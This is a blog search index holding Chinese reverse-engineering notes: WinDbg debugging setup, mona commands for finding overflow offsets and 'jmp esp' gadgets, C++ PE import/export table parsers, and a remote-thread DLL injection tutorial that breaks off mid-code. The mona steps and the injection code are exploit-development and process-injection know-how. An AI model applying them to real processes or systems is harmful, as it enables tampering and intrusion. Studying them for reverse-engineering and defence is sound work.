<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WinDbg双机调试</title>
      <link href="/2023/09/11/WinDbg%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/"/>
      <url>/2023/09/11/WinDbg%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="WinDbg双机调试"><a href="#WinDbg双机调试" class="headerlink" title="WinDbg双机调试"></a>WinDbg双机调试</h1><h3 id="双机调试软件VirtualKD"><a href="#双机调试软件VirtualKD" class="headerlink" title="双机调试软件VirtualKD"></a>双机调试软件VirtualKD</h3><blockquote><p>玄学问题 - 版本差异无法调试问题</p></blockquote><p>建议使用版本：VirtualKD-Redux-2020.5</p><p><a href="VirtualKD-Redux-2020.5.zip">VirtualKD-Redux-2020.5.zip</a></p><h3 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h3><p>Windbg界面按CTRL+S</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SRV*D:\symbols_folder\i386*http:<span class="comment">//msdl.microsoft.com/download/symbols</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 重新加载</span><br><span class="line">.reload /f</span><br></pre></td></tr></table></figure><p>其他方法：</p><blockquote><p>参考文章：<a href="https://bbs.kanxue.com/thread-251052.htm">https://bbs.kanxue.com/thread-251052.htm</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windbg和mona常用指令</title>
      <link href="/2023/08/24/Windbg%E5%92%8Cmona%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/08/24/Windbg%E5%92%8Cmona%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="Windbg和mona常用指令"><a href="#Windbg和mona常用指令" class="headerlink" title="Windbg和mona常用指令"></a>Windbg和mona常用指令</h2><p>&#x2F;&#x2F; 漏洞挖掘</p><blockquote><p>mona</p></blockquote><p><code>.load pykd.pyd // 加载python模块的动态链接库（Python Dynamic Link Library）</code></p><p><code>!py mona pc 3000 //生成序列fuzz字符串</code></p><p><code>!py mona modules //列出程序模块的安全措施等</code></p><p><code>!py mona po 溢出点 //定位溢出点偏移量</code></p><p><code>!py mona jmp -r esp -m &quot;kernel32.dll&quot; //在指定模块寻找指定命令</code></p><p><code>!py mona find -s  -m </code></p><p><code>xse id msxml3.dll // 加载模块时下断点</code></p><blockquote><p>windbg</p></blockquote><p>!heap -a -p <addr> 查找堆块起始位置</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE导入导出表解析</title>
      <link href="/2023/08/24/PE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E8%A1%A8%E8%A7%A3%E6%9E%90/"/>
      <url>/2023/08/24/PE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E8%A1%A8%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="导入表解析"><a href="#导入表解析" class="headerlink" title="导入表解析"></a>导入表解析</h2><h3 id="导入表结构"><a href="#导入表结构" class="headerlink" title="导入表结构"></a>导入表结构</h3><p>在程序加载前INT和IAT内容一致指向同样的结构体，但是在程序加载后INT不变但是IAT会变PE加载器填充为函数地址。</p><p><img src="https://s2.loli.net/2023/08/24/2qplRjbm8ZL3YFJ.png" alt="image-20230824151520040"></p><p><img src="https://s2.loli.net/2023/08/24/CbOfZTlUJ1rjanB.png" alt="image-20230824202648524"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入表VirtualAddress指向的导入表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD Characteristics; </span><br><span class="line">        DWORD OriginalFirstThunk; <span class="comment">//(1) 指向导入名称表(INT)的RVA*</span></span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;     <span class="comment">// (2) 时间标识</span></span><br><span class="line">    DWORD   ForwarderChain;<span class="comment">// (3) 转发链，如果不转发则此值为0</span></span><br><span class="line">    DWORD   Name;   <span class="comment">// (4) 指向导入映像文件的名字*</span></span><br><span class="line">    DWORD   FirstThunk;   <span class="comment">// (5) 指向导入地址表（IAT）的RVA*</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="comment">// INT/未加载前的IAT导入名称/未加载钱的地址表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_THUNK_DATA32</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        PBYTE  ForwarderString;         <span class="comment">// (1) 转发字符串的RVA</span></span><br><span class="line">        PDWORD Function;               <span class="comment">// (2) 被导入函数的地址</span></span><br><span class="line">        DWORD Ordinal;                 <span class="comment">// (3) 被导入函数的序号</span></span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;   <span class="comment">// (4) 名称导入的表 PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">&#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 名称导入的表 PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;<span class="comment">// (1) 需导入的函数序号</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">// (2) 需导入的函数名称</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导入表<code>_IMAGE_IMPORT_DESCRIPTOR</code>中主要包含了</p><ol><li><code>Name</code>导入模块的名称</li><li><code>OriginalFirstThunk</code>记录函数名称的IAT表（加载前和INT相同）</li><li><code>FirstThunk</code>记录函数地址的INT表</li></ol><h3 id="完整解析导入表"><a href="#完整解析导入表" class="headerlink" title="完整解析导入表"></a>完整解析导入表</h3><blockquote><p>PE -&gt; DOS -&gt; NT -&gt; OPT -&gt; section[1]导入表 -&gt; IAT&#x2F;INT -&gt; PIMAGE_IMPORT_BY_NAME、Address</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">L&quot;C:\\Test.dll&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">IsPeFile</span><span class="params">(LPVOID lpFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;</span><br><span class="line"><span class="keyword">if</span> (IMAGE_DOS_SIGNATURE == dosHeader-&gt;e_magic)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LONG)lpFileBuffer + dosHeader-&gt;e_lfanew);</span><br><span class="line"><span class="keyword">if</span> (IMAGE_NT_SIGNATURE == ntHeader-&gt;Signature) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(DWORD rva, LPVOID lpFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 遍历RVA所属哪个区段表，计算段内偏移加上段起始FOA，相加得到FOA</span></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LONG)lpFileBuffer + dosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_FILE_HEADER fileHeader = (PIMAGE_FILE_HEADER)&amp;ntHeader-&gt;FileHeader;</span><br><span class="line">PIMAGE_SECTION_HEADER sectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ntHeader);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历区段表</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; fileHeader-&gt;NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (sectionHeader[i].VirtualAddress &lt;= rva &amp;&amp;</span><br><span class="line">rva &lt;= sectionHeader[i].SizeOfRawData + sectionHeader[i].VirtualAddress)</span><br><span class="line">&#123;</span><br><span class="line">DWORD foa = rva - sectionHeader[i].VirtualAddress + sectionHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">return</span> foa;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析导入表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ParseImportTable</span><span class="params">(LPVOID lpFileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LONG)lpFileBuffer + dosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optHeader = (PIMAGE_OPTIONAL_HEADER)&amp;ntHeader-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取的文件，RVA转成FOA来解析导入表，并不是加载PE，不会进行内存展开。</span></span><br><span class="line">DWORD importTableRva = optHeader-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress;</span><br><span class="line">DWORD importTableFoa = <span class="built_in">RvaToFoa</span>(importTableRva, lpFileBuffer);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR importTable = (PIMAGE_IMPORT_DESCRIPTOR)(importTableFoa + (DWORD)lpFileBuffer);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入表是一个不定长的数组，以 20个全 0 为结尾</span></span><br><span class="line"><span class="keyword">while</span> (importTable-&gt;Name != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取到导入模块的名称</span></span><br><span class="line">DWORD moduleNameFoa = <span class="built_in">RvaToFoa</span>(importTable-&gt;Name, lpFileBuffer);</span><br><span class="line">PCHAR name = (PCHAR)(moduleNameFoa + (DWORD)lpFileBuffer);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;导入的模块名称为： %s\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过FirstThunk成员字段获取 IAT</span></span><br><span class="line">DWORD iatFoa = <span class="built_in">RvaToFoa</span>(importTable-&gt;FirstThunk, lpFileBuffer);</span><br><span class="line">PIMAGE_THUNK_DATA iat = (PIMAGE_THUNK_DATA)(iatFoa + (DWORD)lpFileBuffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (iat-&gt;u1.AddressOfData != <span class="number">0</span>) <span class="comment">// 序号表（函数名称、函数序号）</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 判断是否仅以序号导入的函数</span></span><br><span class="line"> <span class="comment">// 如果IMAGE_THUNK_DATA 最高位为1 则是按序号导入，否则就是按名称导入的。</span></span><br><span class="line"><span class="type">bool</span> isOnlyOrdinal = <span class="built_in">IMAGE_SNAP_BY_ORDINAL</span>(iat-&gt;u1.Ordinal);</span><br><span class="line"><span class="keyword">if</span> (isOnlyOrdinal == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD importByNameTableRva = <span class="built_in">RvaToFoa</span>(iat-&gt;u1.AddressOfData, lpFileBuffer);</span><br><span class="line">PIMAGE_IMPORT_BY_NAME nameTable = (PIMAGE_IMPORT_BY_NAME)(importByNameTableRva + (DWORD)lpFileBuffer);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;导入函数序号为: 0x%02X , 函数名称为: %s \n&quot;</span>, nameTable-&gt;Hint, nameTable-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// 仅以序号导入，最高位为1，剩余部分为函数序号</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数的导入序号为: %x\n&quot;</span>, iat-&gt;u1.Ordinal &amp; <span class="number">0x7FFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iat++;</span><br><span class="line">&#125;</span><br><span class="line">importTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 打开文件，获取文件句柄。</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">FILE_SHARE_READ,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取文件大小，申请堆空间，将读取到的内容放进去。</span></span><br><span class="line">DWORD real_size = <span class="number">0</span>;</span><br><span class="line">DWORD file_size = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pFileBuffer = <span class="keyword">new</span> <span class="type">char</span>[file_size];</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, pFileBuffer, file_size, &amp;real_size, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile); <span class="comment">// 关闭文件句柄，防止资源泄露</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断PE文件，解析导入表</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsPeFile</span>(pFileBuffer) == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;是有效的PE文件\n&quot;</span>);</span><br><span class="line"><span class="built_in">ParseImportTable</span>(pFileBuffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;不是有效的PE文件\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/24/BdZDLvP8EbY1jgt.png" alt="image-20230824200541739"></p><h2 id="导出表解析"><a href="#导出表解析" class="headerlink" title="导出表解析"></a>导出表解析</h2><h3 id="导出表结构"><a href="#导出表结构" class="headerlink" title="导出表结构"></a>导出表结构</h3><blockquote><p>name -&gt; ordinal -&gt; address &#x2F; address -&gt; ordinal -&gt; name &#x2F;&#x2F; 序号表用作名称和地址转换和函数标识</p></blockquote><p><img src="https://s2.loli.net/2023/08/24/e9PJmNv3nVM1ozy.png" alt="image-20230824195916346"></p><p>上述已经解析过PE头，这里直接就展示核心函数，解析导出表。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_export_information</span><span class="params">(LPVOID fileBuff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 获取到导出表RVA -&gt; FOA</span></span><br><span class="line">PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuff;</span><br><span class="line">PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((LONG)fileBuff + dosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER optHeader = (PIMAGE_OPTIONAL_HEADER)&amp;ntHeader-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">DWORD exportTableRva = optHeader-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">DWORD exportTableFoa = <span class="built_in">RvaToFoa</span>(exportTableRva, fileBuff);</span><br><span class="line"></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)fileBuff + exportTableFoa);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印导出表模块名称</span></span><br><span class="line">DWORD exportTableModuleName = <span class="built_in">RvaToFoa</span>(exportTable-&gt;Name, fileBuff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;模块的名称为：%s\n&quot;</span>, exportTableModuleName + (DWORD)fileBuff);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到base基数，序数减去这个基数就是函数地址数组的索引值</span></span><br><span class="line">DWORD base = exportTable-&gt;Base;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取函数序号表位置</span></span><br><span class="line">DWORD exportOrdinalTableRva = <span class="built_in">RvaToFoa</span>(exportTable-&gt;AddressOfNameOrdinals, fileBuff);</span><br><span class="line">PWORD ordinalTable = (PWORD)(exportOrdinalTableRva + (DWORD)fileBuff);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取函数名称表位置</span></span><br><span class="line">DWORD exportNameTableRva = <span class="built_in">RvaToFoa</span>(exportTable-&gt;AddressOfNames, fileBuff);</span><br><span class="line">PDWORD nameTable = (PDWORD)(exportNameTableRva + (DWORD)fileBuff);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取函数地址表位置</span></span><br><span class="line">DWORD exportAddressTable = <span class="built_in">RvaToFoa</span>(exportTable-&gt;AddressOfFunctions, fileBuff);</span><br><span class="line">PDWORD addressTable = (PDWORD)(exportAddressTable + (DWORD)fileBuff);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环遍历三张表（这里使用的导出函数总数，名称表数量只有名称导出函数，没有序号函数）</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> index = <span class="number">0</span>; index &lt; exportTable-&gt;NumberOfFunctions; index++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> isNameExport = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; i &lt; exportTable-&gt;NumberOfNames; i++) <span class="comment">// 循环判断序号导出还是名称导出</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (index == ordinalTable[i]) <span class="comment">// 用名称导出的函数数量，循环自增下标作为索引在序号表里边找</span></span><br><span class="line">    <span class="comment">// 用数组下标在序号表里边找序号，如果找到序号就说明</span></span><br><span class="line">&#123;</span><br><span class="line">isNameExport = <span class="literal">true</span>; <span class="comment">// 是名称导出</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isNameExport) <span class="comment">// 名称导出</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD nameRva = nameTable[i];</span><br><span class="line">DWORD nameFoa = <span class="built_in">RvaToFoa</span>(nameRva, fileBuff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数名称为：%s\n&quot;</span>, nameFoa + (DWORD)fileBuff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (addressTable[index] != <span class="number">0</span>) <span class="comment">// 序号导出</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;函数名字为 NULL， 地址RVA为：0x%08X\n&quot;</span>, addressTable[index]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个表之间的寻找对应关系如下图所示：</p><p><img src="https://s2.loli.net/2023/08/24/YJ6u78Q3iTWFBfD.png" alt="img"></p><blockquote><p>参考文章</p></blockquote><p><a href="https://blog.csdn.net/Apollon_krj/article/details/77417063">https://blog.csdn.net/Apollon_krj/article/details/77417063</a></p><p><a href="https://blog.51cto.com/u_15744744/6121082">https://blog.51cto.com/u_15744744/6121082</a></p><p>《加密与解密》</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见注入方式学习</title>
      <link href="/2023/08/20/%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/20/%E5%B8%B8%E8%A7%81%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="远程线程注入（DLL注入）"><a href="#远程线程注入（DLL注入）" class="headerlink" title="远程线程注入（DLL注入）"></a>远程线程注入（DLL注入）</h2><blockquote><p>加载DLL，dllMain执行</p></blockquote><ul><li><strong>原理</strong>：利用远程线程回调函数执行代码所导致的注入</li><li><strong>流程</strong>：在目标进程中创建远程线程，线程回调函数传参LoadLibrary，传递DLL路径作为回调函数，也就是LoadLibrary的参数。线程执行LoadLibrary后加载DLL并执行。</li><li><strong>优点</strong>： 相对稳定。</li><li><strong>缺点</strong>： 易被检测。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PATH <span class="string">L&quot;D:\\Debug\\injectDLL.dll&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体流程：</span></span><br><span class="line"><span class="comment">//获得目标句柄，申请空间存放变量</span></span><br><span class="line"><span class="comment">//创建远程线程并记载到目标进程中，线程回调函数调用动态库加载API函数</span></span><br><span class="line"><span class="comment">//从而执行自定义代码（线程回调函数加载LoadLibiary方式进行的远程线程注入）</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入流程：</span></span><br><span class="line"><span class="comment">// 得到目标句柄，进行控制（创建线程，并加载自定义DLL）</span></span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%d&quot;</span>, &amp;dwPid);</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPid);</span><br><span class="line"></span><br><span 